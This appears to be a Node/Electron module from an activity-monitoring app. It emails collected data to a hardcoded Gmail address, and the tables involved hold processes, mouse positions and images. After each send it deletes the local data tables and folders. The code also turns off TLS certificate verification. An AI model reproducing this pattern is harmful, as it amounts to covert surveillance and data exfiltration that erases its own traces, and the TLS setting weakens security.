const fs = require('fs');
const path = require('path');
const electron = require('electron');
const uData = (electron.app || electron.remote.app).getPath('userData');
const nodemailer = require('nodemailer');
const removeData = require(path.join(__dirname, '../dbm/removeData'));

const config = JSON.parse(fs.readFileSync(path.join(__dirname, 'config.test.json')));

let transporter = nodemailer.createTransport({
  service: 'gmail',
  secure: false,
  port: 25,
  auth: {
    user: config.email,
    pass: config.pass
  },
  tls: {
    rejectUnauthorized: false
  }
});

let HelperOptions = {
  from: `Shahidul Islam Majumder <${config.email}>`,
  to: 'xp.pground@gmail.com',
  subject: 'Daily Email',
  text: 'Hello there'
};

let sendEmail = function sendMailWithData(msg) {
  HelperOptions.subject = msg.subject;
  HelperOptions.text = msg.description;
  transporter.sendMail(HelperOptions, (error, info) => {
    if (error) {
      console.log(error);
    } else {
      console.log('Sent:', info);
    }
  });
}

let removeDirData = function removeData(datapath) {
  fs.readdir(datapath, (err, files) => {
    if (err)
      throw err;

    for (let file of files) {
      fs.unlink(path.join(datapath, file), err => {
        if (err)
          throw err;
        }
      );
    }
  });
}

let sendData = function(msg, file) {
  HelperOptions.attachments = file;
  HelperOptions.subject = msg.subject;
  HelperOptions.text = msg.description;
  if (HelperOptions.attachments) {
    transporter.sendMail(HelperOptions, (error, info) => {
      if (error) {
        console.log(error);
      } else {

        const dataPack = uData + '/data/dataPack',
              emailData = uData + '/data/emailData';
        setTimeout(removeData.emptyAllTables(['ActiveProcesses', 'MousePos', 'Processes', 'images','Temp']),3000);
        setTimeout(removeDirData(dataPack),3000);
        setTimeout(removeDirData(emailData),3000);

      }
    });
  }
}

module.exports = {
  sendData,
  sendEmail
}
